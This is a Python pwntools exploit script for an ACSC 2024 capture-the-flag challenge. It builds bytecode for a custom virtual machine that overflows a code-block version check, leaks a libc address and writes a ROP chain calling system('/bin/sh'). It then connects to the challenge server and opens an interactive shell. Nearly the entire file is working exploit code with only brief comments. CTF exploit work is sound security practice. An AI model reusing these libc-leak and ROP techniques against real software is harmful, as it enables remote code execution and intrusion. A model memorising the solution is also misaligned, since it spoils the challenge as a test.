from pwn import *
from assembler import *

###Addr
libc_start_main_offset = 0x29d10 + 128
bin_sh_offset = 0x1d8698
system_offset = 0x50d70

###ROPgadget
L_nop = 0x2a3e6
L_pop_rdi = 0x2a3e5

###Exploit
switchRegs = [1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 14, 15]

SWITCH_TEMPLATE = '''
              SWITCH_{{CNT}}:
                load r13, 20
                cmp r{{REG}}, r13
                jae SWITCH_{{CNT_NEXT}}
                load r13, 1
                add r{{REG}}, r13
                jmp CORE
                  '''

ROPCHAIN_TEMPLATE = '''
                mov r2, r1
                load r3, {{GADGET}}
                add r2, r3
                store <8> [r0], r2
                add r0, r6
                    '''

REMAIN_CNT = 256 - 20 * 12 - 2

MAIN_RETURN_OFFSET = 0x70c8 - 0x1004

bcode = aasm(f'''
              ENTRY:
                //cleanup registers so that we can properly control its range upon entering CORE
                load r0, 0
                load r1, 0
                load r2, 0
                load r3, 0
                load r6, 0
                load r7, 0
                load r8, 0
                load r9, 0
                load r10, 0
                load r11, 0
                load r12, 0
                load r13, 0
                load r14, 0
                load r15, 0
                //make r0 a non-concrete value so it would not be reduced to addr load in INCORRECT_RANGE block
                load <1> r0, [r0]
                jmp CORE

              {
                "".join(
                  [
                    SWITCH_TEMPLATE.replace(
                      "{{CNT}}", str(i)
                    ).replace(
                      "{{REG}}", str(reg)
                    ).replace(
                      "{{CNT_NEXT}}", str(i+1)
                    )
                    for (i, reg) in enumerate(switchRegs)
                  ]
                )
              }

              SWITCH_{len(switchRegs)}:
                load r13, {REMAIN_CNT}
                cmp r0, r13
                jae SETUP_FOR_EXPLOIT

                PROCEED_REMAIN_LOOP:
                  load r13, 1
                  add r0, r13
                  jmp RETURN_TO_CORE

                SETUP_FOR_EXPLOIT:
                  //this will definitely be an even number so it will not take jne path in CORE
                  load r0, {MAIN_RETURN_OFFSET}
                  load r13, 0
                  jmp RETURN_TO_CORE

                RETURN_TO_CORE:
                jmp CORE

              //This is the core block which will have its version overflowed
              CORE:
                //slight abuse, if r13 contains 1, we jmp to
                je SWITCH_0

              //first reach this block through the core block once, then finally reach it again after overflowing CORE version
              INCORRECT_RANGE:
                load <8> r1, [r0]
                load r3, {libc_start_main_offset}
                sub r1, r3 //calculate libc base
                load r6, 8
                {
                  "".join(
                    [ROPCHAIN_TEMPLATE.replace(
                      "{{GADGET}}", str(gadget)
                    )
                    for gadget in [L_nop, L_pop_rdi, bin_sh_offset, system_offset]
                    ]
                  )
                }

                sub r13, r6

                //pass on first round(0 / (0 - 20)) and err on second round(20 / (20 - 20)), allowing us to exit vm and return onto ROP
                load r2, 20
                sub r1, r2
                div r2, r1

                //cleanup since we don't want to contaminate states for first return to core
                load r0, 0
                load r1, 0
                load r2, 0
                load r3, 0
                load r6, 0
                load r13, 1

                jmp CORE

              ''')


r = remote('contextual.chal.2024.ctf.acsc.asia', 10101)
r.sendlineafter(b': ', str(len(bcode)).encode())
r.sendafter(b': ', bcode)
r.interactive()
